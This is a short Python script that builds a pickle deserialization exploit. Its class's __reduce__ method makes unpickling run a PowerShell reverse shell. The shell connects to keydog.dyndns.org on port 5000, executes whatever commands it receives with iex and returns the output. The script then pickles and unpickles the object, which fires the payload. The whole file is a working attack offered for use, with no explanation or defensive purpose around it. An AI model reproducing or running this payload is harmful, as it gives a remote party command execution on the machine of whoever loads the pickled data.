# -*- coding: utf-8 -*-
"""
Created on Mon Jun 14 15:56:11 2021

@author: anubi
"""

import pickle

import subprocess

exp = """
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('keydog.dyndns.org',5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
"""
exp = exp[1:-1]
class serialExploit:
    def __reduce__(self):
        return (subprocess.call,(exp,))
#subprocess.call(exp)

d = serialExploit()
b = pickle.dumps(d)
pickle.loads(b)